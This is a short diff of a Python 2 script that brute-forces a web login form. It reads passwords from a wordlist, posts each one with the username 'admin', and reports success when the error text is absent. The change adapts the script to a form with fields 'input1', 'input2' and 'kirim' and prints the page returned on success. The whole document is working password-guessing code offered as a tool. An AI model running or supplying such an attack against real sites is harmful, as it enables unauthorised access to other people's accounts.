@@ -5,7 +5,7 @@ import string
 import time
 # import urllib
 # import re
-# from bs4 import BeautifulSoup
+from bs4 import BeautifulSoup
 
 
 
@@ -22,15 +22,13 @@ for x in file.readlines():
 	x = x.strip()
 	print "Trying " + x
 	data1 = {
-		"username" : "admin",
-		"password" : "%s" %x,
-		"submit" : "LOGIN"
+		"input1" : "admin",
+		"input2" : "%s" %x,
+		"submit" : "kirim"
 	}
 	print data1
 	response = requests.post(input1, data1)
 	if "Something wrong" not in response.text:
 		print x + " Success!"
-		break
-	
-	print response
-		
+		print(response.text)
+		break	
